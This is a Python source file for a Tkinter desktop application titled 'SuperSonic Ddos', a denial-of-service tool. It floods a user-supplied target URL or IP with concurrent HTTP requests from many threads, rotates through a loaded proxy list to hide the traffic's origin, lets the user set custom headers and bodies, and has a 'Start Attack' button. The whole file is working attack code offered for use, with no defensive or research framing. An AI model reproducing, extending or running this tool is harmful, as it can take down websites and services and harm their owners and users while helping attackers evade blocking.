import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import threading, requests, random, queue, csv, time

class DoSApp:
    def __init__(self, master):
        self.master = master
        self.master.title("SuperSonic Ddos #010kx0o")
        self.master.resizable(True, True)

        # === state vars ===
        self.success = tk.IntVar(value=0)
        self.failed = tk.IntVar(value=0)
        self.total_requests = 0

        main = ttk.Frame(master, padding=12); main.grid()

        ttk.Label(main, text="Target (IP or URL):").grid(column=0, row=0, sticky="w")
        self.url_entry = ttk.Entry(main, width=43); self.url_entry.grid(column=1, row=0, columnspan=2, pady=2)

        ttk.Label(main, text="Total Requests:").grid(column=0, row=1, sticky="w")
        self.req_entry = ttk.Entry(main, width=15); self.req_entry.insert(0, "1000"); self.req_entry.grid(column=1, row=1, sticky="w")

        ttk.Label(main, text="Concurrency:").grid(column=0, row=2, sticky="w")
        self.conc_entry = ttk.Entry(main, width=15); self.conc_entry.insert(0, "50"); self.conc_entry.grid(column=1, row=2, sticky="w")

        ttk.Label(main, text="Delay (ms):").grid(column=0, row=3, sticky="w")
        self.delay_entry = ttk.Entry(main, width=15); self.delay_entry.insert(0, "0"); self.delay_entry.grid(column=1, row=3, sticky="w")

        ttk.Label(main, text="HTTP Method:").grid(column=0, row=4, sticky="w")
        self.method_var = tk.StringVar(value="GET")
        ttk.OptionMenu(main, self.method_var, "GET", "GET", "POST", "HEAD", "PUT").grid(column=1, row=4, sticky="w")

        ttk.Label(main, text="User-Agent (optional):").grid(column=0, row=5, sticky="w")
        self.ua_entry = ttk.Entry(main, width=43); self.ua_entry.grid(column=1, row=5, columnspan=2, pady=2)

        ttk.Label(main, text="Extra Headers (key:value per line):").grid(column=0, row=6, sticky="nw")
        self.headers_text = scrolledtext.ScrolledText(main, width=32, height=4); self.headers_text.grid(column=1, row=6, columnspan=2, pady=2)

        ttk.Label(main, text="Body (POST/PUT):").grid(column=0, row=7, sticky="nw")
        self.body_text = scrolledtext.ScrolledText(main, width=32, height=4); self.body_text.grid(column=1, row=7, columnspan=2, pady=2)

        self.use_proxy = tk.BooleanVar()
        ttk.Checkbutton(main, text="Use proxy list", variable=self.use_proxy).grid(column=0, row=8, sticky="w")
        ttk.Button(main, text="Load list…", command=self.load_proxies).grid(column=1, row=8, sticky="w", pady=2)

        self.save_log = tk.BooleanVar()
        ttk.Checkbutton(main, text="Save log", variable=self.save_log, command=self.toggle_log).grid(column=0, row=9, sticky="w")
        self.log_path = tk.StringVar()
        self.log_button = ttk.Button(main, text="Select log file…", command=self.select_log, state="disabled")
        self.log_button.grid(column=1, row=9, sticky="w", pady=2)

        self.save_csv = tk.BooleanVar()
        ttk.Checkbutton(main, text="Save CSV summary", variable=self.save_csv, command=self.toggle_csv).grid(column=0, row=10, sticky="w")
        self.csv_path = tk.StringVar()
        self.csv_button = ttk.Button(main, text="Select CSV file…", command=self.select_csv, state="disabled")
        self.csv_button.grid(column=1, row=10, sticky="w", pady=2)

        ttk.Button(main, text=" Start Attack ", command=self.start_attack).grid(column=0, row=11, columnspan=3, pady=8, ipadx=40)

        self.progress = ttk.Progressbar(main, length=340, mode="determinate"); self.progress.grid(column=0, row=12, columnspan=3, pady=(4,2))
        ttk.Label(main, textvariable=self.success, foreground="green").grid(column=0, row=13, sticky="w")
        ttk.Label(main, text="successful").grid(column=1, row=13, sticky="w")
        ttk.Label(main, textvariable=self.failed, foreground="red").grid(column=0, row=14, sticky="w")
        ttk.Label(main, text="failed").grid(column=1, row=14, sticky="w")

        self.proxy_list = []
        self.task_queue = queue.Queue()
        self.master.after(200, self.update_gui)

    def load_proxies(self):
        path = filedialog.askopenfilename(title="Select proxy list (IP:PORT per line)")
        if not path: return
        with open(path, 'r') as f:
            self.proxy_list = [l.strip() for l in f if l.strip()]
        messagebox.showinfo("Proxies loaded", f"Loaded {len(self.proxy_list)} proxies.")

    def toggle_log(self):
        self.log_button.config(state="normal" if self.save_log.get() else "disabled")

    def select_log(self):
        path = filedialog.asksaveasfilename(defaultextension=".log", title="Select log file")
        if path: self.log_path.set(path)

    def toggle_csv(self):
        self.csv_button.config(state="normal" if self.save_csv.get() else "disabled")

    def select_csv(self):
        path = filedialog.asksaveasfilename(defaultextension=".csv", title="Select CSV file")
        if path: self.csv_path.set(path)

    def send_request(self, url, method, headers, body, delay):
        sess = requests.Session()
        if self.use_proxy.get() and self.proxy_list:
            p = random.choice(self.proxy_list)
            sess.proxies.update({"http": p, "https": p})
        try:
            sess.request(method=method, url=url, headers=headers, data=body, timeout=5)
            self.task_queue.put(("ok", 1))
            if self.save_log.get() and self.log_path.get():
                with open(self.log_path.get(), 'a') as log:
                    log.write(f"[OK] {method} {url}\n")
        except Exception as e:
            self.task_queue.put(("fail", 1))
            if self.save_log.get() and self.log_path.get():
                with open(self.log_path.get(), 'a') as log:
                    log.write(f"[FAIL] {method} {url} -> {e}\n")
        if delay > 0:
            time.sleep(delay / 1000)

    def worker(self, url, method, n_each, headers, body, delay):
        for _ in range(n_each):
            self.send_request(url, method, headers, body, delay)

    def parse_headers(self):
        headers = {}
        ua = self.ua_entry.get().strip()
        if ua: headers["User-Agent"] = ua
        text = self.headers_text.get("1.0", tk.END).strip()
        for line in text.splitlines():
            if ':' in line:
                key, val = line.split(':', 1)
                headers[key.strip()] = val.strip()
        return headers

    def start_attack(self):
        url = self.url_entry.get().strip()
        if not url:
            messagebox.showerror("Error", "Target field is empty."); return
        try:
            total = int(self.req_entry.get()); conc = int(self.conc_entry.get()); delay = int(self.delay_entry.get())
            if total<=0 or conc<=0 or delay<0: raise ValueError
        except ValueError:
            messagebox.showerror("Error", "Enter valid positive integers."); return

        self.total_requests = total
        self.success.set(0); self.failed.set(0)
        self.progress['value'] = 0; self.progress['maximum'] = total

        n_each = total // conc
        method = self.method_var.get().upper()
        headers = self.parse_headers()
        body = self.body_text.get("1.0", tk.END).encode() if method in ("POST","PUT") else None

        for _ in range(conc):
            t = threading.Thread(target=self.worker, args=(url, method, n_each, headers, body, delay), daemon=True)
            t.start()

    def maybe_save_csv(self):
        if self.save_csv.get() and self.csv_path.get():
            with open(self.csv_path.get(), 'w', newline='') as csvfile:
                writer = csv.writer(csvfile)
                writer.writerow(["Total", "Successful", "Failed"])
                writer.writerow([self.total_requests, self.success.get(), self.failed.get()])

    def update_gui(self):
        while not self.task_queue.empty():
            status, val = self.task_queue.get()
            if status == "ok":
                self.success.set(self.success.get()+val)
            else:
                self.failed.set(self.failed.get()+val)
            self.progress['value'] = self.success.get() + self.failed.get()
        # Check completion
        if self.total_requests and (self.success.get() + self.failed.get() >= self.total_requests):
            self.maybe_save_csv()
            self.total_requests = 0  
        self.master.after(200, self.update_gui)

if __name__ == '__main__':
    root = tk.Tk()
    ttk.Style().theme_use('clam')
    DoSApp(root)
    root.mainloop()
